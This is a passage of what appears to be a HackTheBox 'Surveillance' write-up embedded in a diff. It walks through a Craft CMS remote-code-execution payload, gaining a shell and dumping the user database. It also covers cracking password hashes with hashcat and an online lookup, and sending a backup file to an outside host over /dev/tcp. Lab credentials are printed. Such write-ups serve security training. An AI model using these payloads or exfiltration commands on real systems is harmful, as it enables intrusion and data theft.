+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_DB_PASSWORD&#39;</span><span class="o">]</span> CraftCMSPassword2023!
+</span></span></code></pre></div><p>Another thing to note is <code>file_uploads</code> is set to <code>On</code>.</p>
+<p>I rewrite the <code>curl</code> command a little to get a better understanding of what is
+happening.</p>
+<p><code>config.json</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;test[userCondition]&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;as xyz&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;class&#34;</span><span class="p">:</span> <span class="s2">&#34;\\GuzzleHttp\\Psr7\\FnStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;__construct()&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;close&#34;</span><span class="p">:</span> <span class="kc">null</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;_fn_close&#34;</span><span class="p">:</span> <span class="s2">&#34;phpinfo&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ http -f POST http://surveillance.htb/index.php <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">&#39;action=conditions/render&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s1">&#39;test[userCondition]=craft\elements\conditions\users\UserCondition&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">config</span><span class="o">=</span>@config.json
+</span></span></code></pre></div><p>The previously mentioned <a href="https://blog.calif.io/p/craftcms-rce" target="_blank" rel="noopener noreffer ">calif.io craftcms-rce blog post</a>
+suggests possible ways to perform the exploit to run arbitrary code other than
+<code>phpinfo</code>. Unfortunately I was unable to fully figure it out and will return to
+it later. Fortunately an existing Python POC of the exploit exists here
+<a href="https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226" target="_blank" rel="noopener noreffer ">https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226</a>.</p>
+<p>A few modifications to the script needed to be made. First I removed references
+to the proxies and changed the exploit to target a writable file instead of
+<code>/etc/passwd</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;conditions/render&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;configObject[class]&#34;</span><span class="p">:</span> <span class="s2">&#34;craft\elements\conditions\ElementCondition&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;config&#34;</span><span class="p">:</span> <span class="s1">&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;msl:/tmp/file&#34;}}}&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>Either the script is inconsistent, or my modifications aren&rsquo;t optimal. After a
+couple of attempts I managed to get a shell.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-4.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-4.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-4.png"
+        title="Shell Access" width="528" height="786" /></p>
+<h3 id="linux-enumeration">Linux Enumeration</h3>
+<p>I used <code>Girsh</code> to automate the process of upgrading to a better shell and close
+out the connection used with the python script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ girsh listen -p <span class="m">4443</span>
+</span></span><span class="line"><span class="cl">01:08:46  Listening on :4443
+</span></span><span class="line"><span class="cl">Girsh&gt; 01:09:43  Connect from 10.10.11.245:35562
+</span></span><span class="line"><span class="cl">Girsh&gt; sessions
+</span></span><span class="line"><span class="cl"><span class="nv">1</span> <span class="o">=</span>&gt; linux 10.10.11.245:35562
+</span></span><span class="line"><span class="cl">Girsh&gt; connect <span class="m">1</span>
+</span></span><span class="line"><span class="cl">&lt;<span class="o">[</span><span class="s2">&#34;/bin/bash&#34;</span>,<span class="s2">&#34;-c&#34;</span>,<span class="s2">&#34; stty rows 33 cols 92  ;bash&#34;</span><span class="o">])</span><span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                                    /usr/bin/env: &#39;</span>python<span class="s1">&#39;: No such file or directory
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;[&#34;/bin/bash&#34;,&#34;-c&#34;,&#34; stty rows 33 cols 92  ;bash&#34;])&#39;</span>sources$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">124</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">30</span> www-data www-data <span class="m">4096</span> Dec <span class="m">12</span> 09:10 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">8</span> www-data www-data <span class="m">4096</span> Nov  <span class="m">7</span> 21:10 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> www-data www-data   <span class="m">14</span> May <span class="m">23</span>  <span class="m">2023</span> .gitignore
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">4</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 1086baca
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 1be7b37d
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 1ee84e9
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 2df06f28
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 2e77077c
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 <span class="m">36829225</span>
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 406b3277
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 5041a449
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 68d90560
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 6fb3ecb
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 82b5dc63
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 82e60301
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 877101b6
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 88748e5f
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">5</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 ab39c83
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 b50564df
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">4</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 b761b31b
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 bdf69417
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 bebdd9df
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:41 bf6704d6
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 c0d4ee74
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 ceb44668
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 d1a8b721
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 d448a8c9
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 deaf38df
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 e5e12a1b
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 ea30abe7
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">3</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:27 f137a894
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/web/cpresources$
+</span></span></code></pre></div><p>There are two home directories but the <code>www-data</code> user does not have permissions
+to view either.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@surveillance:/$ <span class="nb">cd</span> home
+</span></span><span class="line"><span class="cl">www-data@surveillance:/home$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> root       root       <span class="m">4096</span> Oct <span class="m">17</span> 11:20 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root       root       <span class="m">4096</span> Nov  <span class="m">9</span> 13:19 ..
+</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">3</span> matthew    matthew    <span class="m">4096</span> Nov  <span class="m">9</span> 12:45 matthew
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">2</span> zoneminder zoneminder <span class="m">4096</span> Nov  <span class="m">9</span> 12:46 zoneminder
+</span></span></code></pre></div><p>Using the credentials found earlier through exposed environment variables from
+<code>phpinfo</code>, I&rsquo;m able to log into mysql:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql -h localhost -u craftuser --password<span class="o">=</span>CraftCMSPassword2023!<span class="sb">`</span>
+</span></span></code></pre></div><p>After looking at the tables, I decided to look through the users for passwords.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">MariaDB <span class="o">[</span>craftdb<span class="o">]</span>&gt; <span class="k">select</span> * from users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> photoId <span class="p">|</span> active <span class="p">|</span> pending <span class="p">|</span> locked <span class="p">|</span> suspended <span class="p">|</span> admin <span class="p">|</span> username <span class="p">|</span> fullName  <span class="p">|</span> firstName <span class="p">|</span> lastName <span class="p">|</span> email                  <span class="p">|</span> password                                                     <span class="p">|</span> lastLoginDate       <span class="p">|</span> lastLoginAttemptIp <span class="p">|</span> invalidLoginWindowStart <span class="p">|</span> invalidLoginCount <span class="p">|</span> lastInvalidLoginDate <span class="p">|</span> lockoutDate <span class="p">|</span> hasDashboard <span class="p">|</span> verificationCode <span class="p">|</span> verificationCodeIssuedDate <span class="p">|</span> unverifiedEmail <span class="p">|</span> passwordResetRequired <span class="p">|</span> lastPasswordChangeDate <span class="p">|</span> dateCreated         <span class="p">|</span> dateUpdated         <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span>    NULL <span class="p">|</span>      <span class="m">1</span> <span class="p">|</span>       <span class="m">0</span> <span class="p">|</span>      <span class="m">0</span> <span class="p">|</span>         <span class="m">0</span> <span class="p">|</span>     <span class="m">1</span> <span class="p">|</span> admin    <span class="p">|</span> Matthew B <span class="p">|</span> Matthew   <span class="p">|</span> B        <span class="p">|</span> admin@surveillance.htb <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7</span>/ObcmQ0CXtgw.EpuNcx8tGe <span class="p">|</span> 2023-10-17 20:42:03 <span class="p">|</span> NULL               <span class="p">|</span> NULL                    <span class="p">|</span>              NULL <span class="p">|</span> 2023-10-17 20:38:18  <span class="p">|</span> NULL        <span class="p">|</span>            <span class="m">1</span> <span class="p">|</span> NULL             <span class="p">|</span> NULL                       <span class="p">|</span> NULL            <span class="p">|</span>                     <span class="m">0</span> <span class="p">|</span> 2023-10-17 20:38:29    <span class="p">|</span> 2023-10-11 17:57:16 <span class="p">|</span> 2023-10-17 20:42:03 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+---------+--------+---------+--------+-----------+-------+----------+-----------+-----------+----------+------------------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.000 sec<span class="o">)</span>
+</span></span></code></pre></div><p>Matthew owns the admin account, which suggests this password could be reused for
+the <code>matthew</code> user on the machine. To crack this hash <code>$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe</code>,
+I look for more information on how Craft CMS hashes passwords.</p>
+<p><code>~/html/craft/composer.json</code> reveals additional information about Craft CMS,
+including the version number <code>4.4.14</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@surveillance:~/html/craft$ cat composer.json
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;require&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;craftcms/cms&#34;</span>: <span class="s2">&#34;4.4.14&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vlucas/phpdotenv&#34;</span>: <span class="s2">&#34;^5.4.0&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;require-dev&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;craftcms/generator&#34;</span>: <span class="s2">&#34;^1.3.0&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;yiisoft/yii2-shell&#34;</span>: <span class="s2">&#34;^2.0.3&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;autoload&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;psr-4&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;modules\\&#34;</span>: <span class="s2">&#34;modules/&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;config&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;allow-plugins&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;craftcms/plugin-installer&#34;</span>: true,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;yiisoft/yii2-composer&#34;</span>: <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sort-packages&#34;</span>: true,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;optimize-autoloader&#34;</span>: true,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;platform&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;php&#34;</span>: <span class="s2">&#34;8.0.2&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;scripts&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;post-root-package-install&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;@php -r \&#34;file_exists(&#39;.env&#39;) || copy(&#39;.env.example.dev&#39;, &#39;.env&#39;);\&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">]</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>The CraftCMS GitHub repo on branch <code>4.4</code> reveals how the hash was constructed.</p>
+<ul>
+<li><a href="https://github.com/craftcms/cms/blob/4.4/src/services/Security.php" target="_blank" rel="noopener noreffer ">https://github.com/craftcms/cms/blob/4.4/src/services/Security.php</a></li>
+<li><a href="https://github.com/craftcms/cms/blob/b1bef6445552b68ae65c23787193834f3e7a38f8/src/services/Security.php" target="_blank" rel="noopener noreffer ">https://github.com/craftcms/cms/blob/b1bef6445552b68ae65c23787193834f3e7a38f8/src/services/Security.php</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * Hashes a given password with the bcrypt blowfish encryption algorithm.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     *
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @param string $password The string to hash
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @param bool $validateHash If you want to validate the just generated hash. Will throw an exception if
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * validation fails.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @return string The hash.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">hashPassword</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$password</span><span class="p">,</span> <span class="nx">bool</span> <span class="nv">$validateHash</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hash</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generatePasswordHash</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_blowFishHashCost</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$validateHash</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">validatePassword</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$hash</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">&#39;Could not hash the given string.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$hash</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>I&rsquo;ll run <code>hashcat</code> in the background while continuing enumeration.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="n">-O</span> <span class="n">-m</span> <span class="mf">3200</span> <span class="n">-a</span> <span class="mf">0</span> <span class="n">-w</span> <span class="mf">2</span> <span class="p">-</span><span class="n">-opencl-device-types</span> <span class="mf">1</span><span class="p">,</span><span class="mf">2</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">bycEE</span><span class="p">\</span><span class="n">pentesting</span><span class="p">\</span><span class="n">hashes</span><span class="p">.</span><span class="py">txt</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">bycEE</span><span class="p">\</span><span class="n">pentesting</span><span class="p">\</span><span class="n">cracked</span><span class="p">.</span><span class="py">txt</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">bycEE</span><span class="p">\</span><span class="n">pentesting</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><p>Not long after, there&rsquo;s a backup file that stands out.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@surveillance:~/html/craft/storage$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> www-data www-data <span class="m">4096</span> Oct <span class="m">11</span> 20:12 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">8</span> www-data www-data <span class="m">4096</span> Oct <span class="m">21</span> 18:32 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">53</span> May <span class="m">23</span>  <span class="m">2023</span> .gitignore
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:33 backups
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">2</span> www-data www-data <span class="m">4096</span> Oct <span class="m">17</span> 20:26 config-deltas
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> www-data www-data <span class="m">4096</span> Dec <span class="m">12</span> 09:08 logs
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> www-data www-data <span class="m">4096</span> Oct <span class="m">11</span> 18:01 runtime
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/storage$ <span class="nb">cd</span> backups
+</span></span><span class="line"><span class="cl">www-data@surveillance:~/html/craft/storage/backups$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">2</span> www-data www-data  <span class="m">4096</span> Oct <span class="m">17</span> 20:33 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> www-data www-data  <span class="m">4096</span> Oct <span class="m">11</span> 20:12 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root     root     <span class="m">19918</span> Oct <span class="m">17</span> 20:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
+</span></span></code></pre></div><p>After transferring the file over to my host machine and extracting it, there is
+a <code>surveillance--2023-10-17-202801--v4.4.14.sql</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvnp <span class="m">9000</span> &gt; backup.zip <span class="c1"># host machine</span>
+</span></span><span class="line"><span class="cl">cat surveillance--2023-10-17-202801--v4.4.14.sql.zip &gt; /dev/tcp/10.10.14.5/9000 <span class="c1"># surveillance machine</span>
+</span></span></code></pre></div><p>Grepping for <code>matthew</code> reveals:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">LOCK</span><span class="w"> </span><span class="n">TABLES</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="k">WRITE</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="n">autocommit</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;Matthew B&#39;</span><span class="p">,</span><span class="s1">&#39;Matthew&#39;</span><span class="p">,</span><span class="s1">&#39;B&#39;</span><span class="p">,</span><span class="s1">&#39;admin@surveillance.htb&#39;</span><span class="p">,</span><span class="s1">&#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;</span><span class="p">,</span><span class="s1">&#39;2023-10-17 20:22:34&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;2023-10-11 18:58:57&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;2023-10-17 20:27:46&#39;</span><span class="p">,</span><span class="s1">&#39;2023-10-11 17:57:16&#39;</span><span class="p">,</span><span class="s1">&#39;2023-10-17 20:27:46&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UNLOCK</span><span class="w"> </span><span class="n">TABLES</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">commit</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>This hash looks much easier to crack. After popping it into
+<a href="https://crackstation.net" target="_blank" rel="noopener noreffer ">https://crackstation.net</a>, the plaintext password is revealed.</p>
+<pre tabindex="0"><code>Hash: 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
+Type: sha256
+Result: starcraft122490
+</code></pre><p>The password works with <code>ssh</code> and we get the user flag!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png"
